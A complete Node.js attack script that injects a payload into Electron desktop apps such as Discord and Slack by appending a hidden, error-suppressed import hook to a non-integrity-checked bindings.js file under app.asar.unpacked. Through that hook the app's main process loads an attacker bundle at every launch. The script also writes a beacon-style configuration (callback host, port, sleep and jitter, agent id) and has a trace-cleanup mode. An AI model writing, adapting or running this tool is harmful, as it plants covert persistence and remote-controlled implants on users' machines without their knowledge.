#!/usr/bin/env node
// inject_unpacked.js — script-jack for INTEGRITY-FUSED Electron apps
// (Discord, Slack 4.x, …): the asar rejects repacks AND content patches, but
// files under resources/app.asar.unpacked/ carry no integrity coverage and are
// loaded by the host's own startup chain.
//
// Default target: resources/app.asar.unpacked/node_modules/bindings/bindings.js
// (loaded in the main process at every boot by the classic `bindings` helper).
// We append ONE guarded line that requires our payload from resources/.
//
// Usage:
//   node scripts/inject_unpacked.js --app <install-dir|resources-dir> \
//        --payload dist/bundle.js [--name adpt] [--target <rel/path.js>] \
//        [--id auto] [--host H --port N --ssl] [--sleep 30] [--jitter 20] [--clean]
const fs = require('fs');
const path = require('path');

const arg = (n, d) => { const i = process.argv.indexOf('--' + n); return i >= 0 && process.argv[i + 1] ? process.argv[i + 1] : d; };
const has = (n) => process.argv.includes('--' + n);
const die = (m) => { console.error('[jack] ' + m); process.exit(1); };

const appDir = arg('app', null) || die('usage: inject_unpacked.js --app <dir> --payload <bundle.js> [opts]');
const resourcesDir = fs.existsSync(path.join(appDir, 'resources'))
  ? path.join(appDir, 'resources')
  : appDir; // allow pointing at resources/ directly

const name = arg('name', 'adpt');
const relTarget = arg('target', path.join('app.asar.unpacked', 'node_modules', 'bindings', 'bindings.js'));
const targetPath = path.join(resourcesDir, relTarget);
const payloadPath = path.join(resourcesDir, name + '.js');
const sidecarPath = path.join(resourcesDir, name + '.json');
const MARKER = '/*@@lw*/';

// hook line: main-process only (browser type), fire-once guard, fail silent.
// Dynamic import() — works in BOTH CJS and ESM main entries (VS Code >=1.139
// ships an ESM main.js where `require` does not exist). Payload stays CJS;
// Node's ESM->CJS interop executes it normally. file:// URL + encodeURI for
// spaces/backslashes in resourcesPath.
const HOOK =
  `${MARKER}\ntry{if(process.type==='browser'&&!globalThis.__lw1__){globalThis.__lw1__=1;` +
  `import('file:///'+encodeURI(process.resourcesPath.replace(/\\\\/g,'/')).replace(/\\/$/,'')+'/${name}.js').catch(()=>{})}}catch(e){}\n`;

if (has('clean')) {
  let n = 0;
  if (fs.existsSync(targetPath)) {
    let src = fs.readFileSync(targetPath, 'utf8');
    const at = src.indexOf(MARKER);
    if (at >= 0) { fs.writeFileSync(targetPath, src.slice(0, at)); n++; }
  }
  for (const p of [payloadPath, sidecarPath]) if (fs.existsSync(p)) { fs.unlinkSync(p); n++; }
  console.log(`[jack] clean: removed ${n} artifact(s)`);
  process.exit(0);
}

const srcPayload = arg('payload', null);
if (!srcPayload || !fs.existsSync(srcPayload)) die('--payload <built bundle> required (npm run build)');
if (!fs.existsSync(targetPath)) die(`hook target missing: ${targetPath} (app layout differs — pass --target)`);

fs.copyFileSync(srcPayload, payloadPath);
const sidecar = {
  debug: has('debug'),
  agent_id: arg('id', 'auto'),
  host: arg('host', '127.0.0.1'),
  port: parseInt(arg('port', '8443'), 10),
  ssl: has('ssl'),
  sleep_delay: parseInt(arg('sleep', '30'), 10),
  jitter_delay: parseInt(arg('jitter', '20'), 10),
};
let finalSidecar = sidecar;
try {
  if (fs.existsSync(sidecarPath)) {
    const prev = JSON.parse(fs.readFileSync(sidecarPath, 'utf8'));
    if (String(prev.agent_id) !== String(sidecar.agent_id)) delete prev.session_key;
    finalSidecar = { ...prev, ...sidecar };
  }
} catch (_) {}
fs.writeFileSync(sidecarPath, JSON.stringify(finalSidecar, null, 2) + '\n');

const cur = fs.readFileSync(targetPath, 'utf8');
if (cur.includes(MARKER)) {
  console.log('[jack] target already hooked — payload/config refreshed only');
} else {
  fs.appendFileSync(targetPath, HOOK);
  console.log(`[jack] hooked ${targetPath} (+${HOOK.length}B, guarded, main-process only)`);
}
console.log(`[jack] payload : ${payloadPath}`);
console.log(`[jack] sidecar : ${sidecarPath} (agent_id=${finalSidecar.agent_id}, ${finalSidecar.ssl ? 'https' : 'http'}://${finalSidecar.host}:${finalSidecar.port})`);
